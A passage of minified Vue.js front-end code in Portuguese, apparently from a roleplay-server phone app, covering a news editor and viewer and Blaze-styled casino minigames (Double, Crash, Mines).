        onClick: n => e.$router.push("/weazel/" + t.id),
        class: "border-b border-theme py-5"
    }, [Pl("div", wP, [Pl("div", CP, [Pl("h1", _P, g(t.title), 1), Pl("p", AP, g(e.$filters.ellipsis(t.description.split("\n")[0], 120)), 1)]), t.imageURL ? (wl(), _l("img", {
        key: 0,
        class: "h-32 ml-4 rounded-xl",
        src: t.imageURL
    }, null, 8, ["src"])) : Ml("", !0)]), Pl("div", SP, [Pl("span", RP, [Il(g(e.$filters.unixToRelative(t.created_at)) + " ", 1), TP, Il(" " + g(t.views.toLocaleString()), 1)]), l.isJournalist ? (wl(), _l("div", EP, [Pl("button", {
        onClick: is((n => e.$router.push("/weazel/" + t.id + "/edit")), ["stop"]),
        class: "ml-auto text-blue-600"
    }, [PP], 8, ["onClick"]), Pl("button", {
        onClick: is((e => l.destroy(t.id)), ["stop"]),
        class: "ml-auto text-red-600"
    }, [LP], 8, ["onClick"])])) : Ml("", !0)])], 8, ["onClick"])))), 128))])])])
};
const IP = {
    props: {
        modelValue: {
            required: !0
        },
        type: {
            default: "text"
        },
        noborder: {
            required: !1,
            default: !1
        },
        format: {
            required: !1
        },
        darkable: {
            required: !1
        }
    },
    methods: {
        changeValue({
            target: e
        }) {
            "money" === this.format ? e.value = this.$filters.moneyStringToInt(e.value) : "int" === this.format && (e.value = Math.floor(e.value.replace(/\D/g, ""))), this.$emit("update:modelValue", e.value)
        }
    }
};
IP.render = function(e, t, n, l, a, s) {
    return wl(), _l("input", {
        type: n.type,
        value: n.modelValue,
        onInput: t[1] || (t[1] = (...e) => s.changeValue && s.changeValue(...e)),
        class: ["w-full p-3 py-4", {
            "rounded-lg border focus:border-blue-400": !n.noborder,
            "bg-theme border-theme": n.darkable
        }]
    }, null, 42, ["type", "value"])
};
const OP = {
    props: {
        modelValue: {
            required: !0
        },
        options: {
            default: {}
        },
        darkable: {
            required: !1
        }
    }
};
OP.render = function(e, t, n, l, a, s) {
    return wl(), _l("select", {
        value: n.modelValue,
        onChange: t[1] || (t[1] = t => e.$emit("update:modelValue", t.target.value)),
        class: ["w-full p-3 rounded-lg border focus:border-blue-400", {
            "bg-theme border-theme": n.darkable
        }]
    }, [Pl("option", {
        disabled: "",
        selected: null == n.modelValue,
        value: null
    }, "Escolha uma opção", 8, ["selected"]), (wl(!0), _l(bl, null, fa(n.options, ((e, t) => (wl(), _l("option", {
        key: t,
        value: t,
        selected: n.modelValue == t
    }, g(e), 9, ["value", "selected"])))), 128))], 42, ["value"])
};
const MP = Ze({
        title: "",
        description: "",
        author: _o.identity.name
    }),
    VP = {
        components: {
            Input: IP,
            Select: OP
        },
        setup() {
            const e = _o.settings.isAndroid,
                {
                    id: t
                } = ec().params,
                n = Ze({});

            function l(e) {
                if (null == e ? void 0 : e.error) _o.alert(e.error);
                else {
                    kO.back();
                    for (let e in MP) "title" == e || "description" == e ? MP[e] = "" : delete MP[e];
                    MP.author = _o.identity.name
                }
            }
            return _o.backend.weazel_tags().then((e => {
                for (let t of e) n[t] = t
            })), t && _o.backend.weazel_view(t).then((e => Object.assign(MP, e))), {
                isAndroid: e,
                onImageClick: function() {
                    _o.useAnyImage("/").then((e => {
                        MP.imageURL = e
                    }), (() => {}))
                },
                onPublishClick: function() {
                    t ? _o.backend.weazel_update(t, MP).then(l) : _o.backend.weazel_publish(MP).then(l)
                },
                onPreviewClick: function() {
                    _o.addNotification("weazel", MP.title, Us(MP.description, 120))
                },
                form: MP,
                tags: n
            }
        }
    },
    DP = {
        class: "h-full flex flex-col bg-theme text-theme"
    },
    UP = {
        class: "h-32 pt-12 bg-weazel flex items-center"
    },
    NP = {
        key: 0,
        class: "far fa-arrow-left mr-4"
    },
    $P = {
        key: 1,
        class: "fas fa-chevron-left"
    },
    jP = {
        class: "p-5 text-2xl space-y-4 overflow-y-auto hide-scroll"
    },
    FP = Pl("label", null, "Título", -1),
    zP = Pl("label", null, "Autor", -1),
    BP = Pl("label", null, "Categoria", -1),
    HP = Pl("label", null, "Descrição", -1),
    qP = Pl("label", null, "Vídeo", -1),
    GP = Pl("label", null, "Imagem", -1),
    WP = {
        class: "text-right"
    };
VP.render = function(e, t, n, l, a, s) {
    const o = dl("Input"),
        r = dl("Select");
    return wl(), _l("div", DP, [Pl("div", UP, [Pl("button", {
        onClick: t[1] || (t[1] = t => e.$router.back()),
        class: "absolute top-16 px-5"
    }, [l.isAndroid ? (wl(), _l("i", NP)) : (wl(), _l("i", $P))]), Pl("h1", {
        class: [{
            "ml-16": l.isAndroid,
            "mx-auto": !l.isAndroid
        }, "font-bold"]
    }, g(l.form.id ? "Editar notícia" : "Criar notícia"), 3)]), Pl("div", jP, [Pl("div", null, [FP, Pl(o, {
        class: "text-xl bg-theme border-theme",
        modelValue: l.form.title,
        "onUpdate:modelValue": t[2] || (t[2] = e => l.form.title = e)
    }, null, 8, ["modelValue"])]), Pl("div", null, [zP, Pl(o, {
        class: "text-xl bg-theme border-theme",
        modelValue: l.form.author,
        "onUpdate:modelValue": t[3] || (t[3] = e => l.form.author = e)
    }, null, 8, ["modelValue"])]), Pl("div", null, [BP, Pl(r, {
        class: "text-xl py-4 bg-theme border-theme",
        modelValue: l.form.tag,
        "onUpdate:modelValue": t[4] || (t[4] = e => l.form.tag = e),
        options: l.tags
    }, null, 8, ["modelValue", "options"])]), Pl("div", null, [HP, Zn(Pl("textarea", {
        class: "block resize-none mt-1 w-full bg-theme rounded-xl border border-theme p-2",
        "onUpdate:modelValue": t[5] || (t[5] = e => l.form.description = e),
        rows: "8"
    }, null, 512), [
        [ns, l.form.description]
    ])]), Pl("div", null, [qP, Pl(o, {
        class: "text-xl bg-theme border-theme",
        modelValue: l.form.videoURL,
        "onUpdate:modelValue": t[6] || (t[6] = e => l.form.videoURL = e),
        placeholder: "Exemplo: https://www.youtube.com/watch?v=cDg7eF99nR"
    }, null, 8, ["modelValue"])]), Pl("div", null, [GP, l.form.imageURL ? (wl(), _l("img", {
        key: 0,
        onClick: t[7] || (t[7] = (...e) => l.onImageClick && l.onImageClick(...e)),
        src: l.form.imageURL,
        class: "rounded-xl w-1/2",
        alt: ""
    }, null, 8, ["src"])) : (wl(), _l("button", {
        key: 1,
        onClick: t[8] || (t[8] = (...e) => l.onImageClick && l.onImageClick(...e)),
        class: "bg-weazel block p-2 rounded mt-1"
    }, "Adicionar"))]), Pl("div", WP, [l.form.id ? Ml("", !0) : (wl(), _l("button", {
        key: 0,
        onClick: t[9] || (t[9] = (...e) => l.onPreviewClick && l.onPreviewClick(...e)),
        class: "bg-weazel p-2 px-4 mr-4 rounded mt-1"
    }, "Prever notificação")), Pl("button", {
        onClick: t[10] || (t[10] = (...e) => l.onPublishClick && l.onPublishClick(...e)),
        class: "bg-weazel p-2 px-4 rounded mt-1"
    }, "Publicar")])])])
};
const KP = {
        setup() {
            const e = _o.settings.isAndroid,
                t = ec().params,
                n = Ze(_o.localhost ? {
                    title: "Título da notícia",
                    description: "Descrição da notícia",
                    tag: "Fofocas",
                    author: "Jester Iruka",
                    imageURL: "https://picsum.photos/1920/1080",
                    views: 0,
                    videoURL: "",
                    created_at: Date.now() / 1e3
                } : {}),
                l = da((() => {
                    if ("string" != typeof n.videoURL) return null;
                    for (const e of [/watch\?v=(\w+)/, /youtu\.be\/(\w+)/]) {
                        const t = n.videoURL.match(e);
                        if (t) return "https://www.youtube.com/embed/" + t[1]
                    }
                }));
            return _o.backend.weazel_view(t.id).then((e => {
                e ? Object.assign(n, e) : kO.back()
            })), {
                isAndroid: e,
                post: n,
                videoURL: l
            }
        }
    },
    JP = {
        class: "h-full flex flex-col bg-theme text-theme"
    },
    XP = {
        class: "h-32 pt-12 bg-weazel flex items-center"
    },
    YP = {
        key: 0,
        class: "far fa-arrow-left mr-4"
    },
    ZP = {
        key: 1,
        class: "fas fa-chevron-left"
    },
    QP = {
        key: 0,
        class: "flex-1 overflow-y-auto hide-scroll p-5 rounded-xl"
    },
    eL = {
        class: "space-y-4"
    },
    tL = {
        class: "text-3xl whitespace-pre-wrap opacity-75"
    },
    nL = {
        class: "flex justify-between text-xl opacity-50"
    },
    lL = {
        class: "text-xl opacity-50"
    };
let aL;
KP.render = function(e, t, n, l, a, s) {
    var o;
    return wl(), _l("div", JP, [Pl("div", XP, [Pl("button", {
        onClick: t[1] || (t[1] = t => e.$router.back()),
        class: "absolute top-16 px-5"
    }, [l.isAndroid ? (wl(), _l("i", YP)) : (wl(), _l("i", ZP))]), Pl("h1", {
        class: [{
            "ml-16": l.isAndroid,
            "mx-auto": !l.isAndroid
        }, "font-bold overflow-ellipsis w-96 overflow-hidden whitespace-nowrap"]
    }, g(null != (o = l.post.title) ? o : "Carregando..."), 3)]), l.post.description ? (wl(), _l("div", QP, [Pl("div", eL, [Pl("p", tL, g(l.post.description), 1), l.post.imageURL ? (wl(), _l("img", {
        key: 0,
        class: "w-full rounded-xl",
        src: l.post.imageURL
    }, null, 8, ["src"])) : Ml("", !0), l.videoURL ? (wl(), _l("iframe", {
        key: 1,
        class: "w-full aspect-16/9 rounded-xl",
        src: l.videoURL,
        title: "YouTube video player",
        frameborder: "0",
        allow: "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture",
        allowfullscreen: ""
    }, null, 8, ["src"])) : Ml("", !0), Pl("div", nL, [Pl("h1", null, g(e.$filters.unixToRelative(l.post.created_at)) + " - Em " + g(l.post.tag), 1), Pl("h1", null, g(l.post.author), 1)])]), Pl("h1", lL, g(l.post.views) + " visualizações", 1)])) : Ml("", !0)])
};
const sL = {},
    oL = [0, 1, 8, 2, 9, 3, 10, 4, 11, 5, 12, 6, 13, 7, 14],
    rL = Array(10).fill(oL).flat(),
    iL = {
        setup() {
            const e = rt(),
                t = rt(),
                n = rt(),
                l = rt(0),
                a = rt(""),
                s = rt(!1),
                o = Ze({
                    black: {
                        size: 0,
                        amount: 0,
                        mine: 0
                    },
                    red: {
                        size: 0,
                        amount: 0,
                        mine: 0
                    },
                    white: {
                        size: 0,
                        amount: 0,
                        mine: 0
                    }
                }),
                r = Ze([]),
                i = jl("addBalance"),
                c = jl("onceTab"),
                u = _o.settings.currency;
            let d = !1;
            async function p(e) {
                if (!d) {
                    for (d = !0; e > 0;) {
                        if (!n.value || !t.value) return;
                        n.value.innerHTML = (e / 1e3).toFixed(2) + "s", t.value.style.width = e / 15e3 * 100 + "%", e -= 40, await Qs(40)
                    }
                    d = !1, n.value.innerHTML = "", t.value.style.width = "0%"
                }
            }

            function f(e, t, n) {
                return new Promise((l => {
                    e.animate([t], n).onfinish = () => {
                        Object.assign(e.style, t), l()
                    }
                }))
            }
            return c("CASINO_DOUBLE", (t => {
                !async function(t) {
                    const n = 826.75 + 7 * oL.indexOf(t),
                        l = e.value;
                    if (l instanceof HTMLElement) {
                        l.style.opacity = 1;
                        const e = `translateX(-${n+3*Math.random()*(Math.random()>.5?1:-1)}rem)`;
                        await f(l, {
                            transform: e
                        }, {
                            duration: 8e3,
                            easing: "ease-in-out"
                        }), await f(l, {
                            transform: `translateX(-${n}rem)`
                        }, {
                            duration: 500,
                            delay: 1e3,
                            easing: "ease-out"
                        }), await Qs(2e3), await f(l, {
                            transform: "translate(-91.75rem)"
                        }, {
                            duration: 500,
                            delay: 2e3
                        }), l.style.opacity = .5;
                        const a = function(e) {
                                return 0 == e ? "white" : e < 8 ? "red" : "black"
                            }(t),
                            s = o[a].mine * ("white" == a ? 14 : 2);
                        r.push(a) > 10 && r.shift(), i(s)
                    }
                }(t), s.value = !0
            })), c("CASINO_DOUBLE_RESET", (() => {
                for (const e in o) o[e].size = 0, o[e].amount = 0, o[e].mine = 0;
                s.value = !1
            })), c("CASINO_DOUBLE_BET", (({
                color: e,
                amount: t
            }) => {
                o[e].size += 1, o[e].amount += t
            })), _o.backend.casino_double().then((async e => {
                if (r.push(...e.last), "rolling" === e.status) s.value = !0, await p(e.delay);
                else if ("bet" === e.status) {
                    for (const [t, [n, l]] of Object.entries(e.aggregate)) Object.assign(o[t], {
                        size: n,
                        amount: l
                    });
                    await p(e.delay)
                }
            })), {
                currency: u,
                lastColors: r,
                roulette: e,
                progress: t,
                timer: n,
                pretty: function(e) {
                    return (null != e ? e : 0).toLocaleString()
                },
                bet: function() {
                    const e = a.value,
                        t = parseInt(l.value);
                    t && t > 0 && a.value && _o.backend.casino_double_bet(e, t).then((n => {
                        n.error ? _o.alert(n.error) : (o[e].mine += t, i(-t), p(n))
                    }))
                },
                bets: o,
                amount: l,
                multiply: function(e) {
                    const t = parseInt(l.value);
                    t && t > 0 && (l.value = Math.ceil(t * e))
                },
                color: a,
                waiting: s,
                repeated: rL
            }
        }
    },
    cL = {
        class: "p-5 bg-blaze space-y-5 mb-4"
    },
    uL = {
        class: "container relative py-36 pb-6 bg-blaze-dark rounded-xl"
    },
    dL = {
        class: "absolute top-0 p-5 pt-1 h-20 inset-x-0 border-b border-coolGray-800"
    },
    pL = Pl("h1", {
        class: "text-lg text-white mb-1"
    }, "Últimas rodadas", -1),
    fL = {
        class: "flex space-x-6"
    },
    mL = {
        key: 0,
        class: "w-4",
        src: "https://blaze.com/static/media/logo-icon.75d9365f.svg",
        alt: ""
    },
    hL = {
        key: 1,
        class: "far fa-circle text-xl text-white"
    },
    bL = {
        class: "absolute inset-x-5 rounded overflow-hidden top-24 z-1"
    },
    gL = {
        ref: "progress",
        style: {
            width: "0"
        },
        class: "bg-blaze-red h-6"
    },
    vL = {
        ref: "timer",
        class: "absolute text-white inset-x-0 text-center text-base top-0"
    },
    xL = Pl("div", {
        class: "absolute inset-x-0 bottom-2 top-32 z-1"
    }, [Pl("div", {
        class: "h-full rounded-full w-1.5 bg-white mx-auto"
    })], -1),
    yL = {
        class: "mx-5 rounded-xl overflow-hidden"
    },
    kL = {
        class: "wrapper"
    },
    wL = {
        ref: "roulette",
        style: {
            transform: "translateX(-91.75rem)",
            opacity: "0.5"
        },
        class: "flex space-x-4 transition-opacity duration-500"
    },
    CL = {
        key: 0,
        class: "w-12",
        src: "https://blaze.com/static/media/logo-icon.75d9365f.svg",
        alt: ""
    },
    _L = {
        key: 1
    },
    AL = {
        class: "flex justify-between"
    },
    SL = {
        class: "relative w-64 text-xl"
    },
    RL = {
        class: "absolute right-4 top-6 font-bold text-gray-300"
    },
    TL = Pl("h1", {
        class: "text-gray-300 text-xl"
    }, "Selecionar cor", -1),
    EL = {
        class: "grid grid-cols-3 gap-5"
    },
    PL = {
        class: "flex justify-between items-center p-5 pr-10 bg-blaze mb-4"
    },
    LL = Pl("div", {
        class: "w-16 h-16 rounded-xl bg-blaze-red flex flex-center text-white"
    }, [Pl("i", {
        class: "far fa-circle text-4xl"
    })], -1),
    IL = Pl("h1", {
        class: "mr-auto text-white text-2xl ml-4"
    }, "Vitória 2x", -1),
    OL = {
        class: "text-xl text-right"
    },
    ML = {
        class: "text-gray-300"
    },
    VL = {
        class: "text-white font-bold"
    },
    DL = {
        class: "flex justify-between items-center p-5 pr-10 bg-blaze mb-4"
    },
    UL = Pl("div", {
        class: "w-16 h-16 rounded-xl bg-white flex flex-center text-white"
    }, [Pl("img", {
        class: "w-8",
        src: "https://blaze.com/static/media/logo-icon.75d9365f.svg",
        alt: ""
    })], -1),
    NL = Pl("h1", {
        class: "mr-auto text-white text-2xl ml-4"
    }, "Vitória 14x", -1),
    $L = {
        class: "text-xl text-right"
    },
    jL = {
        class: "text-gray-300"
    },
    FL = {
        class: "text-white font-bold"
    },
    zL = {
        class: "flex justify-between items-center p-5 pr-10 bg-blaze"
    },
    BL = Pl("div", {
        class: "w-16 h-16 rounded-xl bg-blaze-black flex flex-center text-white"
    }, [Pl("i", {
        class: "far fa-circle text-4xl"
    })], -1),
    HL = Pl("h1", {
        class: "mr-auto text-white text-2xl ml-4"
    }, "Vitória 2x", -1),
    qL = {
        class: "text-xl text-right"
    },
    GL = {
        class: "text-gray-300"
    },
    WL = {
        class: "text-white font-bold"
    };
iL.render = function(e, t, n, l, a, s) {
    return wl(), _l(bl, null, [Pl("div", cL, [Pl("div", uL, [Pl("div", dL, [pL, Pl("div", fL, [(wl(!0), _l(bl, null, fa(l.lastColors, ((e, t) => (wl(), _l("div", {
        key: t,
        class: ["w-8 h-8 rounded flex flex-center", ["bg-blaze-" + e]]
    }, ["white" == e ? (wl(), _l("img", mL)) : (wl(), _l("i", hL))], 2)))), 128))])]), Pl("div", bL, [Pl("div", gL, null, 512), Pl("h1", vL, null, 512)]), xL, Pl("div", yL, [Pl("div", kL, [Pl("div", wL, [(wl(!0), _l(bl, null, fa(l.repeated, ((e, t) => (wl(), _l("div", {
        key: t,
        class: ["blaze-tile", 0 == e ? "bg-white" : e > 7 ? "bg-blaze-black text-white" : "bg-blaze-red text-white"]
    }, [0 == e ? (wl(), _l("img", CL)) : (wl(), _l("span", _L, g(e), 1))], 2)))), 128))], 512)])])]), Pl("div", AL, [Pl("div", SL, [Zn(Pl("input", {
        "onUpdate:modelValue": t[1] || (t[1] = e => l.amount = e),
        class: "w-full bg-blaze-dark p-6 font-bold rounded-xl text-gray-300 placeholder-current",
        placeholder: "Quantia",
        type: "text"
    }, null, 512), [
        [ns, l.amount]
    ]), Pl("h1", RL, g(l.currency), 1)]), Pl("button", {
        onClick: t[2] || (t[2] = e => l.multiply(.5)),
        class: "border w-32 rounded-xl text-2xl border-gray-600 text-gray-200"
    }, " ½ "), Pl("button", {
        onClick: t[3] || (t[3] = e => l.multiply(2)),
        class: "border w-32 rounded-xl text-2xl border-gray-600 text-gray-200"
    }, " 2x ")]), TL, Pl("div", EL, [Pl("button", {
        class: [{
            border: "red" == l.color
        }, "bg-blaze-red text-white text-2xl rounded-lg h-20"],
        onClick: t[4] || (t[4] = e => l.color = "red")
    }, " x2 ", 2), Pl("button", {
        class: [{
            border: "white" == l.color
        }, "bg-white text-blaze-red text-2xl rounded-lg h-20 border-red-600"],
        onClick: t[5] || (t[5] = e => l.color = "white")
    }, " x14 ", 2), Pl("button", {
        class: [{
            border: "black" == l.color
        }, "bg-blaze-black text-white text-2xl rounded-lg h-20"],
        onClick: t[6] || (t[6] = e => l.color = "black")
    }, " x2 ", 2)]), Pl("button", {
        onClick: t[7] || (t[7] = (...e) => l.bet && l.bet(...e)),
        class: ["bg-blaze-red w-full h-20 text-white font-bold text-2xl rounded-lg", {
            "opacity-50": l.waiting
        }]
    }, g(l.waiting ? "Esperando" : "Começar o jogo"), 3)]), Pl("div", PL, [LL, IL, Pl("div", OL, [Pl("h1", ML, g(l.pretty(l.bets.red.size)) + " Total de Apostas", 1), Pl("h1", VL, g(e.$filters.intToMoney(l.bets.red.amount)), 1)])]), Pl("div", DL, [UL, NL, Pl("div", $L, [Pl("h1", jL, g(l.pretty(l.bets.white.size)) + " Total de Apostas", 1), Pl("h1", FL, g(e.$filters.intToMoney(l.bets.white.amount)), 1)])]), Pl("div", zL, [BL, HL, Pl("div", qL, [Pl("h1", GL, g(l.pretty(l.bets.black.size)) + " Total de Apostas", 1), Pl("h1", WL, g(e.$filters.intToMoney(l.bets.black.amount)), 1)])])], 64)
};
const KL = {
        setup() {
            const e = _o.settings.currency,
                t = rt(0),
                n = rt(0),
                l = rt(!1),
                a = rt(0),
                s = rt(0),
                o = rt(0),
                r = rt(!1),
                i = Ze([]),
                c = rt(),
                u = rt(),
                d = jl("onceTab"),
                p = jl("addBalance");
            let f, m = !1;
            async function h(e, t = 15e3) {
                clearInterval(m), m = setInterval((() => {
                    if (e <= 0) return c.value.innerHTML = "", u.value.style.width = "0%", clearInterval(m);
                    c.value && u.value && (c.value.innerHTML = (e / 1e3).toFixed(2) + "s", u.value.style.width = e / t * 100 + "%", e = Math.max(0, e - 40))
                }), 40)
            }

            function b(e = 1) {
                t.value = e, f = setInterval((() => {
                    const e = t.value;
                    t.value += .005 * Math.floor(e)
                }), 50)
            }
            return _o.backend.casino_crash().then((async e => {
                i.push(...e.last), o.value = e.totalBet, "waiting" === e.status && e.delay ? await h(e.delay) : "crashing" === e.status ? (await b(e.multiplier), e.totalBet || (l.value = !0)) : "ending" === e.status && (r.value = !0, t.value = e.multiplier, l.value = !0)
            })), d("CASINO_CRASH_CASHOUT", (e => n.value = e)), d("CASINO_CRASH_ENDING", (e => {
                clearInterval(f), i.push(e) > 10 && i.shift(), t.value = e, r.value = !0, l.value = !0, h(5e3, 5e3)
            })), d("CASINO_CRASH_REFRESH", (() => {
                l.value = !1, t.value = 0, r.value = !1, o.value = 0, n.value = null
            })), d("CASINO_CRASH", (e => {
                t.value = 1, e ? r.value = !0 : b()
            })), d("CASINO_CRASH_WARMUP", (() => h(15e3))), wn((() => {
                clearInterval(f), clearInterval(m)
            })), {
                currency: e,
                timer: c,
                progress: u,
                won: n,
                crashed: r,
                multiplier: t,
                start: b,
                waiting: l,
                bet: function() {
                    var e, t;
                    if (l.value) return;
                    const n = parseInt(a.value);
                    if (n && n > 0) {
                        const l = parseFloat(null == (t = null == (e = s.value) ? void 0 : e.replace) ? void 0 : t.call(e, ",", ".")) || null;
                        _o.backend.casino_crash_bet(n, l).then((e => {
                            e.error ? _o.alert(e.error) : (o.value += n, p(-n), h(e.delay))
                        }))
                    }
                },
                stop: function() {
                    l.value || _o.backend.casino_crash_cashout().then((e => {
                        e.error ? _o.alert(e.error) : (o.value = 0, p(e[1]), n.value = e)
                    }))
                },
                totalBet: o,
                amount: a,
                multiply: function(e) {
                    const t = parseInt(a.value);
                    t && t > 0 && (a.value = Math.ceil(t * e))
                },
                cashout: s,
                rounds: i
            }
        }
    },
    JL = sn("data-v-6c02b606");
ln("data-v-6c02b606");
const XL = {
        class: "p-5 bg-blaze h-full overflow-y-auto space-y-5"
    },
    YL = {
        class: "p-3 rounded-3xl bg-blaze-dark relative"
    },
    ZL = {
        class: "flex justify-end text-white space-x-4 text-2xl overflow-hidden"
    },
    QL = {
        class: "absolute inset-x-10 rounded overflow-hidden top-24 z-1"
    },
    eI = {
        ref: "progress",
        style: {
            width: "0"
        },
        class: "bg-blaze-red h-8"
    },
    tI = {
        ref: "timer",
        class: "absolute text-white inset-x-0 text-center text-2xl top-0"
    },
    nI = {
        key: 0,
        class: "absolute text-center inset-0 flex justify-center items-start top-40"
    },
    lI = {
        class: "bg-blaze-green rounded-xl overflow-hidden text-white text-4xl leading-loose"
    },
    aI = {
        class: "bg-green-600 leading-loose text-xl px-4"
    },
    sI = {
        key: 0,
        class: "bg-blaze-red rounded-xl overflow-hidden text-white text-4xl w-40 leading-loose"
    },
    oI = Pl("p", {
        class: "bg-red-700 leading-loose text-xl"
    }, "CRASHED", -1),
    rI = {
        key: 1,
        class: "bg-blaze-light rounded-xl text-white w-32"
    },
    iI = Pl("i", {
        class: "f6-thin block text-white text-opacity-5",
        style: {
            "font-size": "32.5rem",
            "line-height": "0.95"
        }
    }, "", -1),
    cI = {
        class: "flex justify-between"
    },
    uI = {
        class: "relative w-64 text-xl"
    },
    dI = {
        class: "absolute right-4 top-6 font-bold text-gray-300"
    },
    pI = {
        class: "relative w-full text-xl"
    },
    fI = Pl("label", {
        class: "text-xl text-gray-300"
    }, "Auto retirar", -1),
    mI = Pl("h1", {
        class: "absolute right-4 top-16 font-bold text-gray-300"
    }, "X", -1);
an();
const hI = JL(((e, t, n, l, a, s) => (wl(), _l("div", XL, [Pl("div", YL, [Pl("ul", ZL, [(wl(!0), _l(bl, null, fa(l.rounds, ((e, t) => (wl(), _l("li", {
    key: t,
    class: ["p-2 rounded-xl", {
        "bg-blaze-light": e < 2,
        "bg-blaze-green": e >= 2
    }]
}, g(e.toFixed(2)), 3)))), 128))]), Pl("div", QL, [Pl("div", eI, null, 512), Pl("h1", tI, null, 512)]), l.won ? (wl(), _l("div", nI, [Pl("div", lI, [Il(" x " + g(l.won[0].toFixed(2)) + " ", 1), Pl("p", aI, "VOCÊ GANHOU! " + g(e.$filters.intToMoney(l.won[1])), 1)])])) : Ml("", !0), l.multiplier ? (wl(), _l("div", {
    key: 1,
    class: [{
        "top-28": l.won
    }, "absolute text-center inset-0 grid place-items-center"]
}, [l.crashed ? (wl(), _l("div", sI, [Il(g(l.multiplier.toFixed(2)) + "x ", 1), oI])) : l.multiplier ? (wl(), _l("div", rI, g(l.multiplier.toFixed(2)) + "x ", 1)) : Ml("", !0)], 2)) : Ml("", !0), iI]), l.totalBet > 0 && l.multiplier > 0 ? (wl(), _l("button", {
    key: 0,
    onClick: t[1] || (t[1] = (...e) => l.stop && l.stop(...e)),
    class: ["bg-blaze-red w-full h-20 text-white font-bold text-2xl rounded-lg", {
        "opacity-50": l.waiting
    }]
}, " Parar " + g(e.$filters.intToMoney(l.totalBet * l.multiplier)), 3)) : (wl(), _l("button", {
    key: 1,
    onClick: t[2] || (t[2] = (...e) => l.bet && l.bet(...e)),
    class: ["bg-blaze-red w-full h-20 text-white font-bold text-2xl rounded-lg", {
        "opacity-50": l.waiting
    }]
}, g(l.waiting ? "Esperando" : "Começar o jogo"), 3)), Pl("div", cI, [Pl("div", uI, [Zn(Pl("input", {
    "onUpdate:modelValue": t[3] || (t[3] = e => l.amount = e),
    class: "w-full bg-blaze-dark p-6 font-bold rounded-xl text-gray-300 placeholder-current",
    placeholder: "Quantia",
    type: "text"
}, null, 512), [
    [ns, l.amount]
]), Pl("h1", dI, g(l.currency), 1)]), Pl("button", {
    onClick: t[4] || (t[4] = e => l.multiply(.5)),
    class: "border w-32 rounded-xl text-2xl border-gray-600 text-gray-200"
}, " ½ "), Pl("button", {
    onClick: t[5] || (t[5] = e => l.multiply(2)),
    class: "border w-32 rounded-xl text-2xl border-gray-600 text-gray-200"
}, " 2x ")]), Pl("div", pI, [fI, Zn(Pl("input", {
    "onUpdate:modelValue": t[6] || (t[6] = e => l.cashout = e),
    class: "w-full bg-blaze-dark mt-2 p-6 font-bold rounded-xl text-gray-300 placeholder-current",
    placeholder: "Quantia",
    type: "text"
}, null, 512), [
    [ns, l.cashout]
]), mI])]))));
KL.render = hI, KL.__scopeId = "data-v-6c02b606";
const bI = Ze({
    revealed: {}
});

function gI() {
    Object.keys(bI).forEach((e => delete bI[e])), bI.revealed = {}
}
const vI = {
        setup() {
            const e = _o.settings.currency,
                t = rt(0),
                n = rt(2),
                l = da((() => Object.keys(bI.revealed).length > 0)),
                a = jl("addBalance");
            return {
                currency: e,
                game: bI,
                canFinish: l,
                amount: t,
                mines: n,
                multiply: function(e) {
                    const n = parseInt(t.value);
                    n && n > 0 && (t.value = Math.ceil(n * e))
                },
                click: function(e) {
                    e in bI.revealed || !bI.id || bI.lost || bI.clicking || (bI.clicking = !0, _o.backend.casino_mine_click(e).then((t => {
                        if (t.error) return _o.alert(t.error);
                        "mine" == t[0] && (bI.lost = !0), bI.revealed[e] = t[0], bI.reward = t[1]
                    })).finally((() => bI.clicking = !1)))
                },
                play: function() {
                    if (bI.lost) gI();
                    else if (bI.id) bI.clicking = !0, _o.backend.casino_mine_finish().then((e => {
                        e.error ? _o.alert(e.error) : (a(e.reward), gI())
                    }));
                    else {
                        const e = parseInt(t.value) || 0;
                        _o.backend.casino_mine_start(e, n.value).then((t => {
                            t.error ? _o.alert(t.error) : (a(-e), Object.assign(bI, t))
                        }))
                    }
                },
                finish: function() {
                    l.value && _o.backend.casino_mine_finish().then((e => {
                        if (e.error) return _o.alert(e.error);
                        a(e.reward), gI()
                    }))
                }
            }
        }
    },
    xI = {
        class: "bg-blaze h-full p-5 space-y-5"
    },
    yI = {
        class: "bg-blaze-dark grid grid-cols-5 gap-8 p-5 rounded-xl"
    },
    kI = {
        key: 0,
        class: "fad fa-gem text-lightBlue-400 animate-flip"
    },
    wI = {
        key: 1,
        class: "fal fa-bomb text-blaze-red animate-flip"
    },
    CI = {
        key: 0,
        class: "flex justify-between"
    },
    _I = {
        class: "relative w-64 text-xl"
    },
    AI = {
        class: "absolute right-4 top-6 font-bold text-gray-300"
    },
    SI = {
        key: 1,
        class: "text-xl space-y-2"
    },
    RI = Pl("h1", {
        class: "text-white"
    }, "Quantidade de minas", -1),
    TI = {
        key: 2,
        class: "text-xl space-y-2"
    },
    EI = Pl("h1", {
        class: "text-white"
    }, "Prêmio", -1);
vI.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", xI, [Pl("div", yI, [(wl(!0), _l(bl, null, fa(Array(25), ((e, t) => (wl(), _l("button", {
        key: t,
        onClick: e => l.click(t),
        class: "aspect-1/1 bg-gradient-to-br from-coolGray-800 to-coolGray-900 rounded-lg flex flex-center"
    }, ["diamond" == l.game.revealed[t] ? (wl(), _l("i", kI)) : "mine" == l.game.revealed[t] ? (wl(), _l("i", wI)) : Ml("", !0)], 8, ["onClick"])))), 128))]), l.game.id ? Ml("", !0) : (wl(), _l("div", CI, [Pl("div", _I, [Zn(Pl("input", {
        "onUpdate:modelValue": t[1] || (t[1] = e => l.amount = e),
        class: "w-full bg-blaze-dark p-6 font-bold rounded-xl text-gray-300 placeholder-current",
        placeholder: "Quantia",
        type: "text"
    }, null, 512), [
        [ns, l.amount]
    ]), Pl("h1", AI, g(l.currency), 1)]), Pl("button", {
        onClick: t[2] || (t[2] = e => l.multiply(.5)),
        class: "border w-32 rounded-xl text-2xl border-gray-600 text-gray-200"
    }, " ½ "), Pl("button", {
        onClick: t[3] || (t[3] = e => l.multiply(2)),
        class: "border w-32 rounded-xl text-2xl border-gray-600 text-gray-200"
    }, " 2x ")])), l.game.id ? (wl(), _l("div", TI, [EI, Pl("input", {
        disabled: "",
        value: l.game.reward,
        class: "w-full bg-blaze-dark p-6 font-bold rounded-xl text-gray-300 placeholder-current",
        placeholder: "Quantidade",
        type: "text"
    }, null, 8, ["value"])])) : (wl(), _l("div", SI, [RI, Zn(Pl("input", {
        "onUpdate:modelValue": t[4] || (t[4] = e => l.mines = e),
